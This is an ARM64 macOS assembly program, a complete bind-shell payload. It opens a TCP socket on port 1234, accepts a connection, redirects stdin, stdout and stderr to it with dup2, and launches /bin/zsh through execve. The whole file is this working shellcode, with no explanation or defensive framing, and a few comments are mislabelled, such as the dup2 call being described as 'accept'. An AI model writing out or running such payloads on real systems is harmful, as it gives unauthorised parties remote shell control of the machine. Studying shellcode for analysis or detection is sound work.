.global	_main
.align	4

_main:
	;;; obtain socket
	mov	X0, #2			; domain PF_INET
	mov 	X1, #1			; type = SOCK_STREAM
	mov 	X2, XZR			; protocol = IPPROTO_IP
	mov 	X16, #97		; BSD system call for socker
	svc 	0
	mov	X11, X0			; save return value for later use

	;;; bind socket to local address
	mov	X2, #16			; address_len = 16
	mov	X4, #0x0200		; sin_len = 0, sin_family = 2
	movk	X4, #0xD204, lsl#16	; sin_port = 1234
	stp	X4, XZR, [SP,#-16]!	; store on stack
	mov	X1, SP			; save stack pointer
	mov	X16, #104		; BSD system call for bind
	svc	0
	
	;;; listen for incoming connection
	mov	X0, X11			; restore socket
	mov	X1, XZR			; backlog = null
	mov	X16, #106		; BSD system call for listen
	svc	0	

	;;; accept incoming connection
	mov	X0, X11			; restore socket
	mov	X1, XZR			; ignore address store
	mov	X2, XZR			; ignore length of address structure
	mov	X16, #30		; BSD system call for accept
	svc	0
	mov	X12, X0			; save our new socket descriptor

	;;; duplicate file descriptors
	mov	X16, #90		; BSD system call for accept
	mov	X1, #2			; file descriptor 2 = STDERR
	svc	0
	mov	X0, X12			; restore socket
	mov	X1, #1			; file descriptor 1 = STDOUT
	svc	0
	mov	X0, X12			; restore socket
	lsr	X1, X1, #1		; file descriptor 0 = STDIN
	svc	0

	;;; launch shell via execve

	mov	X3, #0x622F			; move "/bin/zsh" int X3
	movk	X3, #0x6E69, lsl#16
	movk	X3, #0x7A2F, lsl#32
	movk	X3, #0x6873, lsl#48
	stp	X3, XZR, [SP,#-16]!	; push to stack
	mov	X0, SP			; save pointer to  argv[0]
	stp	X0, XZR, [SP,#-16]!	; push argv[0] and terminating 0 to stack
	mov	X1, SP			; move pointer to argument array into X1
	mov	X2, XZR			; third argument for execve
	mov	X16, #59		; BSD system call for execve
	svc	0




